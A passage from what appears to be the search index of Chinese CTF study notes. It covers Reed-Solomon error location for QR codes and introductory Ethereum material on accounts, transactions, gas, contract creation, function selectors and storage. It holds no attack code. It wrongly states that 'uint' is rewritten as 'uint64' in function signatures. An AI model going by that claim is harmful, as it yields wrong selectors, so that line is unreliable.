_{2}Y_{k}X_{k}^{j+\\nu -2}+\\cdots +\\Lambda _{\\nu }Y_{k}X_{k}^{j}\\right)=0\\] \u7136\u540e\u8f6c\u6362\u4e3a\u6bcf\u9879\u7d2f\u52a0\u5e76\u63d0\u53d6\u51fa \\(\\Lambda_i\\) \uff1a \\[\\left(\\sum _{k=1}^{\\nu }Y_{k}X_{k}^{j+\\nu }\\right)+\\Lambda _{1}\\left(\\sum _{k=1}^{\\nu }Y_{k}X_{k}^{j+\\nu -1}\\right)+\\cdots +\\Lambda _{\\nu }\\left(\\sum _{k=1}^{\\nu }Y_{k}X_{k}^{j}\\right)=0\\] \u6839\u636e\u5178\u578b\u503c\u7684\u5b9a\u4e49\u6709\uff1a \\[S_{j+\\nu}+\\Lambda_1S_{j+\\nu-1}+\\cdots+\\Lambda_\\nu S_k=0\\] \u628a \\(S_{j+\\nu}\\) \u79fb\u5230\u53f3\u8fb9\uff0c\u5e76\u5c55\u5f00\u6240\u6709 \\(j\\) \u53ef\u4ee5\u5f97\u5230\u77e9\u9635\u5f62\u5f0f\uff1a \\[\\begin{bmatrix} S_{0}&S_{1}&\\cdots &S_{\\nu-1}\\\\\\\\S_{1}&S_{2}&\\cdots &S_{\\nu}\\\\\\\\\\vdots &\\vdots &&\\vdots \\\\\\\\S_{\\nu-1}&S_{\\nu}&\\cdots &S_{2\\nu -2} \\end{bmatrix} \\begin{bmatrix}\\Lambda _{\\nu }\\\\\\\\\\Lambda _{\\nu -1}\\\\\\\\\\vdots \\\\\\\\\\Lambda _{1} \\end{bmatrix} = \\begin{bmatrix} -S_{\\nu}\\\\\\\\-S_{\\nu +1}\\\\\\\\\\vdots \\\\\\\\-S_{2\\nu-1 } \\end{bmatrix}\\] \u6b64\u65f6\u662f\u4e00\u4e2a\u7ebf\u6027\u65b9\u7a0b\u7ec4\uff0c\u800c\u4e14 \\(S_i\\) \u5168\u90e8\u5df2\u77e5\uff0c\u53ef\u4ee5\u89e3\u5f97 \\(\\Lambda_i\\)","title":"\u9519\u8bef\u5b9a\u4f4d\u591a\u9879\u5f0f"},{"location":"ctf/qrcode/#_9","text":"\u6b64\u65f6\u591a\u9879\u5f0f \\(\\Lambda(x)\\) \u5df2\u7ecf\u5b8c\u5168\u5df2\u77e5\uff0c\u6240\u4ee5\u53ef\u4ee5\u6c42\u5f97\u5176\u6839\uff08\u7528 Chien search \u7b97\u6cd5\u5728\u4f3d\u7f57\u74e6\u57df\u4e0a\u6c42\u6839\uff09 \u518d\u7b97\u5176\u5012\u6570\u5373\u53ef\u5f97\u5230 \\(X_k\\) \uff0c\u7136\u540e\u53ef\u4ee5\u5bfb\u627e\u5230\u9519\u8bef\u4f4d\u7f6e \\(i_k\\) \u8fd9\u65f6\u4e5f\u5c31\u53ef\u4ee5\u5e26\u5165\u7b2c\u4e00\u4e2a\u65b9\u7a0b\u7ec4\u6c42\u5f97\u9519\u8bef\u5927\u5c0f \\(Y_k\\) \uff08\u6216\u8005\u5229\u7528 Forney algorithm\uff09 \u5f97\u5230\u4e86 \\(e(x)\\) \u540e\u5c31\u53ef\u4ee5\u6839\u636e \\(r(x)\\) \u7b97\u51fa\u539f\u59cb\u4fe1\u606f \\(s(x)\\) \u4e86","title":"\u5f97\u5230\u9519\u8bef\u4f4d\u7f6e\u548c\u5927\u5c0f"},{"location":"ctf/blockchain/","text":"\u533a\u5757\u94fe \u00b6 Abstract \u533a\u5757\u94fe\u4e5f\u662f\u8fd1\u51e0\u5e74 misc \u5e38\u51fa\u7684\u4e00\u7c7b\u9898\u76ee\uff0c\u6709\u65f6\u4e5f\u4f1a\u5355\u72ec\u5206\u533a\u3002\u5176\u4e2d\u5927\u90e8\u5206\u662f\u5173\u4e8e\u4ee5\u592a\u574a\u667a\u80fd\u5408\u7ea6\u7684\u3002 2022 \u5e74\u521d\u6211\u5f00\u59cb\u63a5\u89e6\u8fd9\u7c7b\u9898\u76ee\uff0c\u8fd9\u91cc\u8bb0\u5f55\u4e00\u4e9b\u603b\u7ed3\u4e4b\u7c7b\u7684\u4e1c\u897f\u3002 Table of Contents \u00b6 Ethereum \u4ee5\u592a\u574a \u4ee5\u592a\u574a\u57fa\u7840 \u4ee5\u592a\u574a\u865a\u62df\u673a \u5e38\u89c1\u5408\u7ea6\u6f0f\u6d1e\u653b\u51fb\u624b\u6bb5\uff08 WIP \uff09 ERC \u6807\u51c6\uff08 WIP \uff09","title":"\u533a\u5757\u94fe"},{"location":"ctf/blockchain/#_1","text":"Abstract \u533a\u5757\u94fe\u4e5f\u662f\u8fd1\u51e0\u5e74 misc \u5e38\u51fa\u7684\u4e00\u7c7b\u9898\u76ee\uff0c\u6709\u65f6\u4e5f\u4f1a\u5355\u72ec\u5206\u533a\u3002\u5176\u4e2d\u5927\u90e8\u5206\u662f\u5173\u4e8e\u4ee5\u592a\u574a\u667a\u80fd\u5408\u7ea6\u7684\u3002 2022 \u5e74\u521d\u6211\u5f00\u59cb\u63a5\u89e6\u8fd9\u7c7b\u9898\u76ee\uff0c\u8fd9\u91cc\u8bb0\u5f55\u4e00\u4e9b\u603b\u7ed3\u4e4b\u7c7b\u7684\u4e1c\u897f\u3002","title":"\u533a\u5757\u94fe"},{"location":"ctf/blockchain/#table-of-contents","text":"Ethereum \u4ee5\u592a\u574a \u4ee5\u592a\u574a\u57fa\u7840 \u4ee5\u592a\u574a\u865a\u62df\u673a \u5e38\u89c1\u5408\u7ea6\u6f0f\u6d1e\u653b\u51fb\u624b\u6bb5\uff08 WIP \uff09 ERC \u6807\u51c6\uff08 WIP \uff09","title":"Table of Contents"},{"location":"ctf/blockchain/eth/","text":"Ethereum \u4ee5\u592a\u574a \u00b6 Abstract ETH \u662f\u533a\u5757\u94fe\u9898\u76ee\u4e2d\u6700\u5e38\u89c1\u7684\u4e00\u7c7b\u4e86\uff0cCTF \u4e2d\u4e3b\u8981\u6d89\u53ca\u667a\u80fd\u5408\u7ea6\u7684\u5b89\u5168\u95ee\u9898\u3002 Table of Contents \u00b6 \u4ee5\u592a\u574a\u57fa\u7840 \u4ee5\u592a\u574a\u865a\u62df\u673a \u5e38\u89c1\u5408\u7ea6\u6f0f\u6d1e\u653b\u51fb\u624b\u6bb5\uff08 WIP \uff09 ERC \u6807\u51c6\uff08 WIP \uff09","title":"Ethereum \u4ee5\u592a\u574a"},{"location":"ctf/blockchain/eth/#ethereum","text":"Abstract ETH \u662f\u533a\u5757\u94fe\u9898\u76ee\u4e2d\u6700\u5e38\u89c1\u7684\u4e00\u7c7b\u4e86\uff0cCTF \u4e2d\u4e3b\u8981\u6d89\u53ca\u667a\u80fd\u5408\u7ea6\u7684\u5b89\u5168\u95ee\u9898\u3002","title":"Ethereum \u4ee5\u592a\u574a"},{"location":"ctf/blockchain/eth/#table-of-contents","text":"\u4ee5\u592a\u574a\u57fa\u7840 \u4ee5\u592a\u574a\u865a\u62df\u673a \u5e38\u89c1\u5408\u7ea6\u6f0f\u6d1e\u653b\u51fb\u624b\u6bb5\uff08 WIP \uff09 ERC \u6807\u51c6\uff08 WIP \uff09","title":"Table of Contents"},{"location":"ctf/blockchain/eth/basic/","text":"\u4ee5\u592a\u574a\u57fa\u7840 \u00b6 Abstract \u4e00\u4e9b ETH \u9898\u76ee\u4e2d\u4f1a\u7528\u5230\u7684\u4ee5\u592a\u574a\u57fa\u7840\u77e5\u8bc6 \u57fa\u7840\u73af\u5883 \u00b6 Remix \uff1a\u4ee5\u592a\u574a\u667a\u80fd\u5408\u7ea6 IDE MetaMask \uff1a\u4ee5\u592a\u574a\u94b1\u5305 Etherscan \uff1a\u4ee5\u592a\u574a\u533a\u5757\u94fe\u6d4f\u89c8\u5668 geth \uff1a\u4ea4\u4e92\u5de5\u5177 \u8d26\u6237 \u00b6 \u4ee5\u592a\u574a\u4e2d\u7684\u8d26\u6237\uff08Account\uff09\u5206\u4e3a\u4e24\u7c7b\uff0c\u5206\u522b\u662f\u5916\u90e8\u8d26\u6237\uff08Externally Owned Account, EOA\uff09\u548c\u5408\u7ea6\u8d26\u6237\uff08Contract Account\uff09\u3002 \u5916\u90e8\u8d26\u6237 \u7531\u4eba\u521b\u5efa\u7684\uff0c\u76f8\u5f53\u4e8e\u94b1\u5305\uff0c\u53ef\u4ee5\u5b58\u50a8\u4ee5\u592a\u5e01\uff0c\u53d1\u9001\u4ea4\u6613\u7b49 \u6bcf\u4e2a\u5916\u90e8\u8d26\u6237\u90fd\u6709\u4e00\u5bf9\u516c\u79c1\u94a5\uff0c\u7528\u4e8e\u7b7e\u7f72\u4ea4\u6613\u7b49 \u79c1\u94a5\u662f\u4e00\u4e2a 256 \u4f4d\u6570\uff0832 \u5b57\u8282\uff09 \u516c\u94a5\u7531\u79c1\u94a5\u7ecf ECDSA \u8ba1\u7b97\u800c\u6765\uff0c\u662f\u4e00\u4e2a 64 \u5b57\u8282\u7684\u6570 \u5730\u5740\u662f\u516c\u94a5\u8ba1\u7b97 keccak256 \u54c8\u5e0c\u540e\u53d6\u540e 20 \u5b57\u8282\u7684\u503c\uff08\u4e00\u822c\u8868\u793a\u4e3a 0x + 40 \u4e2a\u5341\u516d\u8fdb\u5236\u5b57\u7b26\uff09 \u5408\u7ea6\u8d26\u6237 \u5408\u7ea6\u8d26\u6237\u662f\u7531\u5916\u90e8\u8d26\u6237\u901a\u8fc7\u4ea4\u6613\u521b\u5efa\u7684\u8d26\u6237\uff0c\u5176\u4e2d\u5305\u542b\u5408\u7ea6\u4ee3\u7801 \u5408\u7ea6\u5730\u5740 CREATE \u64cd\u4f5c\u7801\uff1a\u901a\u8fc7\u521b\u5efa\u8005\u5730\u5740\u3001\u4ea4\u6613\u7684 nonce \u503c\u5171\u540c\u8ba1\u7b97 keccak256 \u54c8\u5e0c\u5f97\u5230 CREATE2 \u64cd\u4f5c\u7801\uff08\u541b\u58eb\u5766\u4e01\u5821\u786c\u5206\u53c9\u540e\uff09\uff1a\u901a\u8fc7\u521b\u5efa\u8005\u5730\u5740\u3001\u76d0\u503c\u3001\u5408\u7ea6\u521b\u5efa\u4ee3\u7801\u8ba1\u7b97\u5f97\u5230 \u5408\u7ea6\u8d26\u6237\u540c\u6837\u4e5f\u53ef\u4ee5\u5b58\u50a8\u3001\u62e5\u6709\u4ee5\u592a\u5e01 \u5411\u4e00\u4e2a\u5408\u7ea6\u8d26\u6237\u53d1\u9001\u4ea4\u6613\u76f8\u5f53\u4e8e\u8c03\u7528\u5408\u7ea6\u4e2d\u7684\u51fd\u6570 \u5408\u7ea6\u8d26\u6237\u4e0d\u80fd\u81ea\u884c\u53d1\u8d77\u4ea4\u6613\uff0c\u4f46\u53ef\u4ee5\u5728\u88ab\u8c03\u7528\u65f6\u5411\u5916\u53d1\u9001\u4ea4\u6613 \u8fd9\u4e24\u7c7b\u8d26\u6237\u90fd\u662f \u201c\u72b6\u6001\u5bf9\u8c61\u201d\uff0c\u4e00\u4e2a\u4ee5\u592a\u574a\u8d26\u6237\u5305\u542b\uff1a nonce\uff1a\u5df2\u7ecf\u53d1\u9001\u7684\u4ea4\u6613\u6570\u91cf balance\uff1a\u8d26\u6237\u4f59\u989d\uff0c\u5373\u5b58\u50a8\u7684\u4ee5\u592a\u5e01\u6570\u91cf storageRoot\uff1a\u5b58\u50a8\u533a\u7684\u54c8\u5e0c\u503c\uff0c\u6307\u5411\u5408\u7ea6\u8d26\u6237\u7684\u5b58\u50a8\u6570\u636e\u533a codeHash\uff1a\u4ee3\u7801\u533a\u7684\u54c8\u5e0c\u503c\uff0c\u6307\u5411\u5408\u7ea6\u8d26\u6237\u5b58\u50a8\u7684\u667a\u80fd\u5408\u7ea6\u4ee3\u7801 \u4ee5\u592a\u5e01\u5355\u4f4d \u00b6 \u4ee5\u592a\u5e01\u7684\u6700\u5c0f\u5355\u4f4d\u662f wei\uff0c\u5176\u662f\u4e00\u4e2a\u5f88\u5c0f\u7684\u5355\u4f4d\uff0c\u4e00\u4e9b\u5176\u4ed6\u5355\u4f4d\uff1a 1 Kwei (1 Babbage) = \\(10^3\\) wei 1 Mwei (1 Lovelace) = \\(10^6\\) wei 1 Gwei (1 Shannon) = \\(10^9\\) wei 1 Szabo (1 microether) = \\(10^{12}\\) wei 1 Finney (1 milliether) = \\(10^{15}\\) wei 1 Ether = \\(10^{18}\\) wei \u5355\u4f4d\u6362\u7b97\uff1a Ethereum Unit Converter \u4ea4\u6613 \u00b6 \u4ee5\u592a\u574a\u4e2d\u7684\u4ea4\u6613\uff08Transaction\uff09\u6307\u7684\u662f\u4ece\u4e00\u6761\u8d26\u6237\u53d1\u9001\u5230\u53e6\u4e00\u6761\u8d26\u6237\u7684\u6d88\u606f\u7684\u7b7e\u540d\u6570\u636e\u5305\uff0c\u65e0\u8bba\u662f\u8f6c\u8d26\u8fd8\u662f\u521b\u5efa\u667a\u80fd\u5408\u7ea6\u3001\u8c03\u7528\u667a\u80fd\u5408\u7ea6\u90fd\u662f\u901a\u8fc7\u4ea4\u6613\u8fdb\u884c\u7684\u3002\u6bcf\u4e00\u7b14\u4ea4\u6613\u4e5f\u4f1a\u652f\u4ed8\u4e00\u5b9a\u7684\u624b\u7eed\u8d39\u3002 \u4ea4\u6613\u5185\u5bb9 \u00b6 \u4e00\u6761\u4ea4\u6613\u5305\u542b\u4ee5\u4e0b\u5185\u5bb9\uff1a from\uff1a\u4ea4\u6613\u53d1\u9001\u8005\u5730\u5740 to\uff1a\u4ea4\u6613\u63a5\u6536\u8005\u5730\u5740\uff0c\u5982\u679c\u4e3a\u7a7a\u5219\u8868\u793a\u662f\u5728\u521b\u5efa\u667a\u80fd\u5408\u7ea6 value\uff1a\u4ea4\u6613\u91d1\u989d\uff0c\u5373\u53d1\u9001\u65b9\u8981\u7ed9\u63a5\u6536\u65b9\u8f6c\u79fb\u7684\u4ee5\u592a\u5e01\u6570\u91cf\uff08wei \u4e3a\u5355\u4f4d\uff09 data\uff1a\u4ea4\u6613\u6570\u636e\uff0c\u5982\u679c\u662f\u521b\u5efa\u667a\u80fd\u5408\u7ea6\u5219\u662f\u667a\u80fd\u5408\u7ea6\u4ee3\u7801\uff0c\u5982\u679c\u662f\u8c03\u7528\u667a\u80fd\u5408\u7ea6\u5219\u662f\u8c03\u7528\u7684\u51fd\u6570\u540d\u548c\u53c2\u6570 gasPrice\uff1a\u4ea4\u6613\u7684 gas \u4ef7\u683c\uff0c\u5373\u6bcf\u5355\u4f4d gas \u7684\u4ef7\u683c\uff08wei \u4e3a\u5355\u4f4d\uff09 gasLimit\uff1a\u4ea4\u6613\u7684 gas \u4e0a\u9650\uff0c\u5373\u4ea4\u6613\u5141\u8bb8\u6267\u884c\u7684\u6700\u5927 gas \u6570\u91cf nonce\uff1a\u4ea4\u6613\u7684\u5e8f\u53f7\uff0c\u5373\u53d1\u9001\u8005\u5df2\u7ecf\u53d1\u9001\u7684\u4ea4\u6613\u6570\u91cf \u9664\u6b64\u4e4b\u5916\u53d1\u9001\u7684\u4ea4\u6613\u6570\u636e\u5305\u8fd8\u9700\u8981\u5305\u542b\uff1a hash\uff1a\u4ea4\u6613\u7684\u54c8\u5e0c\u503c\uff0c\u7531\u524d\u9762\u7684\u5185\u5bb9\u548c chainId \u8ba1\u7b97\u5f97\u5230 v\u3001r\u3001s\uff1a\u4ea4\u6613\u7b7e\u540d\u7684\u4e09\u4e2a\u90e8\u5206\uff0c\u7531\u53d1\u9001\u8005\u79c1\u94a5\u5bf9\u4ea4\u6613\u54c8\u5e0c\u503c\u8fdb\u884c\u7b7e\u540d\u5f97\u5230 \u4e09\u79cd\u4ea4\u6613 \u00b6 \u4ee5\u592a\u574a\u7684\u4ea4\u6613\u53ef\u4ee5\u5206\u4e3a\u4e09\u79cd\u573a\u666f\uff1a \u8f6c\u8d26\u4ea4\u6613\uff1a\u4ece\u4e00\u4e2a\u8d26\u6237\u5411\u53e6\u4e00\u4e2a\u8d26\u6237\u53d1\u9001\u4ee5\u592a\u5e01 \u5fc5\u987b\u8981\u6307\u5b9a from\u3001to\u3001value\uff0c\u5206\u522b\u8868\u793a\u53d1\u9001\u8005\u3001\u63a5\u6536\u8005\u3001\u8f6c\u79fb\u7684\u4ee5\u592a\u5e01\u6570\u91cf\uff08\u5176\u5b83\u5b57\u6bb5\u6709\u9ed8\u8ba4\u503c\uff09 \u4ea4\u6613\u6570\u636e\u5305\u4e2d\u7684 data \u4e3a\u7a7a \u63a5\u6536\u65b9\u53ef\u4ee5\u662f EOA \u4e5f\u53ef\u4ee5\u662f\u5408\u7ea6\u8d26\u6237 \u521b\u5efa\u5408\u7ea6\u4ea4\u6613\uff1a\u521b\u5efa\u4e00\u4e2a\u5408\u7ea6\u8d26\u6237\uff08\u5c06\u5408\u7ea6\u90e8\u7f72\u5230\u94fe\u4e0a\uff09 \u5fc5\u987b\u8981\u6307\u5b9a from\u3001data\uff0c\u5206\u522b\u8868\u793a\u53d1\u9001\u8005\u3001\u5408\u7ea6\u4ee3\u7801\uff08\u7f16\u8bd1\u540e\u7684\u5b57\u8282\u7801\uff09 \u4ea4\u6613\u6570\u636e\u5305\u4e2d\u7684 to \u4e3a\u7a7a \u8c03\u7528\u5408\u7ea6\u4ea4\u6613\uff1a\u8c03\u7528\u4e00\u4e2a\u5408\u7ea6\u8d26\u6237\u7684\u51fd\u6570 \u5fc5\u987b\u8981\u6307\u5b9a from\u3001to\u3001data\uff0c\u5206\u522b\u8868\u793a\u53d1\u9001\u8005\u3001\u63a5\u6536\u8005\u3001\u8c03\u7528\u7684\u4fe1\u606f data \u5b57\u6bb5\u662f\u7f16\u7801\u540e\u7684\u51fd\u6570\u540d\uff08\u9009\u62e9\u5b50\uff09\u548c\u53c2\u6570 \u4ea4\u6613\u624b\u7eed\u8d39 \u00b6 \u6bcf\u7b14\u4ea4\u6613\u90fd\u9700\u8981\u652f\u4ed8\u4e00\u5b9a\u7684\u624b\u7eed\u8d39\uff0c\u6765\u8865\u507f\u6267\u884c\u65f6\u7684\u8ba1\u7b97\u5f00\u9500\uff0c\u540c\u65f6\u4e5f\u4f1a\u652f\u4ed8\u7ed9\u77ff\u5de5\u4f5c\u4e3a\u6253\u5305\u4ea4\u6613\u7684\u5956\u52b1\u3002 \u624b\u7eed\u8d39\u4e0d\u662f\u7531\u4ee5\u592a\u5e01\u76f4\u63a5\u8ba1\u7b97\u7684\uff0c\u800c\u662f\u901a\u8fc7 gas \u6765\u4f5c\u4e3a\u5355\u4f4d\uff0c\u901a\u8fc7 gasPrice \u4e0e\u4ee5\u592a\u5e01\u8fdb\u884c\u6362\u7b97\u3002 gasPrice \u662f\u4e00\u5355\u4f4d gas \u5bf9\u5e94\u7684\u4ee5\u592a\u5e01\u4ef7\u503c\uff08wei \u4e3a\u5355\u4f4d\uff09\uff0cgasLimit \u662f\u4ea4\u6613\u53d1\u9001\u8005\u613f\u610f\u4e3a\u8fd9\u7b14\u4ea4\u6613\u652f\u4ed8\u7684\u6700\u5927 gas \u6570\u91cf\u3002\u5728\u4ea4\u6613\u6267\u884c\u65f6\uff0c\u4f1a\u6d88\u8017 gas\uff0c\u5982\u679c\u6d88\u8017\u7684 gas \u6570\u91cf\u5c0f\u4e8e gasLimit\uff0c\u5219\u4ea4\u6613\u6210\u529f\u6267\u884c\uff0c\u77ff\u5de5\u4f1a\u6536\u53d6\u5b9e\u9645\u6d88\u8017\u7684 gas * gasPrice \u7684\u624b\u7eed\u8d39\uff1b\u5982\u679c\u6267\u884c\u8fc7\u7a0b\u4e2d\u6d88\u8017\u7684 gas \u8d85\u8fc7\u4e86 gasLimit\uff0c\u5219\u4ea4\u6613\u5931\u8d25\uff0c\u4f1a\u56de\u6eda\uff08revert\uff09\u5230\u4ea4\u6613\u6267\u884c\u524d\u7684\u72b6\u6001\uff0c\u540c\u65f6\u77ff\u5de5\u4f1a\u6536\u53d6 gasLimit * gasPrice \u7684\u624b\u7eed\u8d39\u3002 \u5408\u7ea6 \u00b6 \u5408\u7ea6\u8d26\u6237\u548c\u521b\u5efa\u5408\u7ea6\u3001\u8c03\u7528\u5408\u7ea6\u7684\u4ea4\u6613\u5728\u524d\u9762\u5df2\u7ecf\u8bf4\u8fc7\u4e86\u3002\u4e0b\u9762\u662f\u4e00\u4e9b\u5173\u4e8e\u5408\u7ea6\u7684\u5b9e\u73b0\u3001\u539f\u7406\u7b49\u5185\u5bb9\u3002 \u7f16\u5199\u5408\u7ea6 \u00b6 \u5408\u7ea6\u4e00\u822c\u662f\u4f7f\u7528 Solidity \u8bed\u8a00\u8fdb\u884c\u7f16\u5199\u7684\uff0c\u9664\u6b64\u4e4b\u5916\u4e5f\u6709 Yul \u7b49\u8bed\u8a00\u3002\u5173\u4e8e Solidity \u7684\u8bed\u6cd5\u5c31\u4e0d\u5728\u8fd9\u91cc\u5199\u4e86\u3002 \u5408\u7ea6\u7f16\u5199\u540e\u9700\u8981\u901a\u8fc7\u7f16\u8bd1\u5668\u7f16\u8bd1\u6210 EVM \u53ef\u6267\u884c\u7684\u5b57\u8282\u7801\u3002\u76f8\u5173\u5b57\u8282\u7801\u5728\u53e6\u5916\u7684\u7ae0\u8282\u6765\u5199\uff08TODO\uff09 \u603b\u4e4b\u53ef\u4ee5\u4f7f\u7528 Remix IDE \u6765\u8fdb\u884c\u5408\u7ea6\u7684\u7f16\u5199\u3001\u7f16\u8bd1\u3001\u90e8\u7f72\u3001\u8c03\u8bd5\u7b49\u64cd\u4f5c\u3002 \u5408\u7ea6\u7684\u521b\u5efa \u00b6 \u524d\u9762\u8bf4\u5230\u4e86\u5408\u7ea6\u8981\u901a\u8fc7\u4ea4\u6613\u6765\u8fdb\u884c\u521b\u5efa\uff0c\u8fd9\u4e2a\u4ea4\u6613\u7684 to \u5b57\u6bb5\u5e94\u8be5\u4e3a\u7a7a\uff0c\u4e14 data \u5b57\u6bb5\u4e3a\u7f16\u8bd1\u540e\u7684\u5408\u7ea6\u5b57\u8282\u7801\u3002 \u5728\u6267\u884c\u4ea4\u6613\u65f6\uff0c\u8fd9\u4e2a data \u5b57\u6bb5\u7684\u5185\u5bb9\u4f1a\u88ab\u653e\u5728 EVM \u4e0a\u6267\u884c\uff0c\u5b83\u53ef\u4ee5\u662f\u4efb\u610f\u53ef\u6267\u884c\u7684\u5b57\u8282\u7801\uff0c\u9047\u5230 return \u6307\u4ee4\u76f4\u63a5\u8fd4\u56de\uff0c\u4e5f\u53ef\u4ee5\u8fd4\u56de\u7ed3\u679c\uff08\u4e14\u6709\u56de\u663e\uff09\u3002 \u4e00\u822c\u7684\u5408\u7ea6\u5b57\u8282\u7801\u4f1a\u5206\u4e3a\u4e24\u4e2a\u90e8\u5206\uff0c\u5373 creationCode \u548c runtimeCode\u3002\u5b83\u4eec\u662f\u62fc\u63a5\u5728\u4e00\u8d77\u7684\u4e00\u4e2a\u6574\u4f53\u3002\u5728 EVM \u8fd0\u884c\u5b57\u8282\u7801\u65f6\uff0c\u5148\u6267\u884c creationCode \u90e8\u5206\uff0c\u5176\u4f5c\u7528\u662f\u8fd0\u884c\u6784\u5efa\u51fd\u6570\u3001\u8bbe\u7f6e\u5408\u7ea6\u521d\u59cb\u72b6\u6001\uff0c\u7136\u540e\u8fd4\u56de runtimeCode\uff0c\u8fd9\u4e2a\u5c06\u4f1a\u88ab\u90e8\u7f72\u5230\u94fe\u4e0a\u4ee3\u7801\u533a\u3002\u4e4b\u540e\u5728\u94fe\u4e0a\u5b58\u50a8\u7684\u5c31\u53ea\u662f runtimeCode \u90e8\u5206\uff0c\u4e5f\u662f\u8c03\u7528\u65f6\u4f1a\u6267\u884c\u7684\u5b9e\u9645\u90e8\u5206\u3002 \u5982\u679c\u5408\u7ea6\u7684\u6784\u5efa\u51fd\u6570\u662f payable \u7684\uff0c\u90a3\u4e48\u53ef\u4ee5\u5728\u521b\u5efa\u4ea4\u6613\u7684\u65f6\u5019\u901a\u8fc7 value \u5b57\u6bb5\u6765\u9644\u5e26\u4ee5\u592a\u5e01\uff0c\u8fd9\u4e9b\u4ee5\u592a\u5e01\u4f1a\u88ab\u8f6c\u79fb\u5230\u5408\u7ea6\u8d26\u6237\u4e2d\u3002\u5982\u679c\u4e0d\u662f payable \u4f46\u521b\u5efa\u65f6\u5411\u5176\u8f6c\u8d26\u4e86\uff0c\u90a3\u4e48\u8fd9\u6761\u4ea4\u6613\u4f1a revert\u3002 \u5408\u7ea6\u7684\u8c03\u7528 \u00b6 \u5408\u7ea6\u7684\u8c03\u7528\u4e5f\u662f\u901a\u8fc7\u4ea4\u6613\u6765\u8fdb\u884c\u7684\uff0c\u8fd9\u4e2a\u4ea4\u6613\u7684 to \u5b57\u6bb5\u5e94\u8be5\u4e3a\u5408\u7ea6\u8d26\u6237\u5730\u5740\uff0cdata \u5b57\u6bb5\u4e3a\u7f16\u7801\u540e\u7684\u51fd\u6570\u540d\u548c\u53c2\u6570\uff0c\u79f0\u4e3a calldata\u3002 calldata \u5206\u4e3a\u4e24\u4e2a\u90e8\u5206\uff0c\u5f00\u5934\u56db\u4e2a\u5b57\u8282\u4f1a\u8868\u660e\u8981\u8c03\u7528\u7684\u51fd\u6570\uff0c\u4e5f\u88ab\u79f0\u4e3a function selector\uff1b\u540e\u9762\u7684\u90e8\u5206\u662f\u51fd\u6570\u7684\u53c2\u6570\u3002 Selector \u00b6 Selector \u662f\u51fd\u6570\u7b7e\u540d\u7684 keccak256 \u54c8\u5e0c\u503c\u7684\u524d\u56db\u4e2a\u5b57\u8282\u3002 \u5176\u4e2d\u51fd\u6570\u7b7e\u540d\uff1a \u57fa\u7840\u539f\u578b\u662f\u7531\u51fd\u6570\u540d\u79f0\u52a0\u4e0a\u62ec\u53f7\u62ec\u8d77\u6765\u7684\u53c2\u6570\u7c7b\u578b\u5217\u8868\uff0c\u53c2\u6570\u7c7b\u578b\u4e4b\u95f4\u7528\u9017\u53f7\u5206\u9694\u4e14\u65e0\u7a7a\u683c \u5bf9\u4e8e uint \u7c7b\u578b\u8981\u8f6c\u6210 uint64 \u5bf9\u4e8e\u7ed3\u6784\u4f53\uff0c\u4f1a\u5c06\u5176\u6210\u5458\u7c7b\u578b\u5c55\u5f00\u5e76\u7528\u62ec\u53f7\u62ec\u8d77\u6765 \u5728\u8fdb\u884c\u4e00\u4e2a\u8c03\u7528\u7684\u65f6\u5019\uff0c\u4f1a\u5148\u5c06 data \u4e2d\u7684 selector \u4e0e\u5408\u7ea6\u4e2d\u7684\u51fd\u6570\u7b7e\u540d\u8fdb\u884c\u6bd4\u5bf9\uff1a \u5982\u679c\u5b58\u5728\u76f8\u540c\u7684\u51fd\u6570\u7b7e\u540d\uff0c\u90a3\u4e48\u5c31\u4f1a\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570 \u5982\u679c\u4e0d\u5b58\u5728\uff1a \u5982\u679c\u5b58\u5728 fallback \u51fd\u6570\uff0c\u90a3\u4e48\u5c31\u4f1a\u8c03\u7528 fallback \u51fd\u6570 \u5426\u5219 revert \u76f8\u5e94\u7684\u903b\u8f91\u662f\u5728\u5408\u7ea6\u7f16\u8bd1\u7684\u65f6\u5019\u5199\u5728 runtimeCode \u91cc\u7684\uff0c\u5176\u5927\u81f4\u903b\u8f91\u662f\uff1a if (msg.value) { revert(); } // \u5982\u679c\u4e0d\u662f payable \u7684\u8bdd\u4f1a\u6709\u8fd9\u53e5 if (msg.data.length == 0) { fallback(); } // \u5982\u679c\u6ca1\u6709 fallback \u5c31 revert if (msg.data[0:4] == selector1) { function1(); } else if (msg.data[0:4] == selector2) { function2(); } else { fallback(); // \u5982\u679c\u6709 fallback // revert(); // \u5982\u679c\u6ca1\u6709 fallback } \u5408\u7ea6\u4e2d\u83b7\u53d6\u6570\u636e \u00b6 Solidity \u4e2d\u6709\u4e00\u4e9b\u5168\u5c40\u53d8\u91cf\u53ef\u4ee5\u7528\u6765\u83b7\u53d6\u533a\u5757\u4fe1\u606f\u3001\u4ea4\u6613\u4fe1\u606f\u7b49\uff1a block.chainid\u3001block.coinbase\u3001block.number\u3001block.timestamp\u2026\u2026 msg.data\uff1a\u5b8c\u6574\u7684 calldata msg.sender\uff1a\u5f53\u524d\u8c03\u7528\u8005\u7684\u5730\u5740 msg.sig\uff1aselector\uff0c\u4e5f\u5c31\u662f calldata \u7684\u524d\u56db\u4e2a\u5b57\u8282 msg.value\uff1a\u4ea4\u6613\u4e2d\u9644\u5e26\u7684\u4ee5\u592a\u5e01\u6570\u91cf\uff08wei\uff09 tx.gasprice\uff1a\u4ea4\u6613\u7684 gasprice tx.origin\uff1a\u4ea4\u6613\u7684\u53d1\u8d77\u8005\uff08\u6574\u6761\u8c03\u7528\u94fe\u6700\u5f00\u5934\u7684\u8d26\u6237\uff09 \u5b58\u50a8 \u00b6 \u4ee5\u592a\u574a\u4f1a\u4e3a\u5408\u7ea6\u63d0\u4f9b\u4e00\u4e2a\u5b58\u50a8\u7a7a\u95f4\uff0c\u5176\u5b58\u50a8\u76f8\u5f53\u4e8e\u4e00\u4e2a \\(2^{256}\\) \u5927\u5c0f\u7684\u6570\u7ec4\uff0c\u6570\u7ec4\u4e2d\u6bcf\u4e2a\u5143\u7d20\u79f0\u4e3a\u63d2\u69fd\uff08slot\uff09\uff0c\u6bcf\u4e2a\u63d2\u69fd\u7684\u5927\u5c0f\u662f 256 \u4f4d\uff0c\u4e5f\u5c31\u662f 32 \u5b57\u8282\u3002\u6574\u4f53\u5bb9\u91cf\u975e\u5e38\u5de8\u5927\uff0c\u4f46\u5b58\u50a8\u662f\u7a00\u758f\u7684\uff0c\u5373\u53ea\u4f1a\u5b58\u50a8\u6709\u503c\u7684\u63d2\u69fd\u3002 Solidity 